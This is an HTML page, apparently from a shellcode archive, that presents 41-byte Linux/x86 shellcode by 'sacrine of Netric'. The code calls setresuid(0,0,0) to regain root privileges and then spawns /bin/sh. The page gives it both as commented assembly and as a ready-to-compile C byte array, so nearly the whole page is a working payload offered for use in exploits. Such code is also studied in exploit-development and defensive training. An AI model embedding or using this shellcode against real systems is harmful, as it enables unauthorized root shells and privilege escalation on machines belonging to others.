<html><head><title>Linux/x86 - setresuid(0,0,0); execve /bin/sh; exit; - 41 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* linux x86 shellcode(41 bytes) by sacrine of Netric (www.netric.org)
 * setresuid(0,0,0); execve /bin/sh; exit;
 *

        __asm(&quot; xorl %eax,%eax
                xorl %ebx,%ebx
                xorl %ecx,%ecx
                cdq
                movb $0xa4, %al
                int $0x80

                xorl %eax,%eax
                push %eax
                pushl   $0x68732f2f
                pushl   $0x6e69622f
                mov %esp, %ebx
                push %eax
                push %ebx
                lea (%esp,1),%ecx
                movb $0xb, %al
                int $0x80

                xorl %eax,%eax
                mov  $0x1, %al
                int $0x80
&quot;); 

*/

char main[]=
        // setresuid(0,0,0);

        &quot;\x31\xc0&quot;              // xor  %eax,%eax
        &quot;\x31\xdb&quot;              // xor  %ebx,%ebx
        &quot;\x31\xc9&quot;              // xor  %ecx,%ecx
        &quot;\x99&quot;                  // cdq
        &quot;\xb0\xa4&quot;              // mov  $0xa4, %al
        &quot;\xcd\x80&quot;              // int  $0x80

        // execve /bin/sh

        &quot;\x31\xc0&quot;                      // xor    %eax,%eax
        &quot;\x50&quot;                          // push   %eax
        &quot;\x68\x2f\x2f\x73\x68&quot;          // push   $0x68732f2f
        &quot;\x68\x2f\x62\x69\x6e&quot;          // push   $0x6e69622f
        &quot;\x89\xe3&quot;                      // mov    %esp,%ebx
        &quot;\x50&quot;                          // push   %eax
        &quot;\x53&quot;                          // push   %ebx
        &quot;\x8d\x0c\x24&quot;                  // lea    (%esp,1),%ecx
        &quot;\xb0\x0b&quot;                      // mov    $0xb,%al
        &quot;\xcd\x80&quot;                      // int    $0x80

        // exit

        &quot;\x31\xc0&quot;              // xorl %eax,%eax
        &quot;\xb0\x01&quot;              // movb $0x1, %al
        &quot;\xcd\x80&quot;;             // int  $0x80




<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
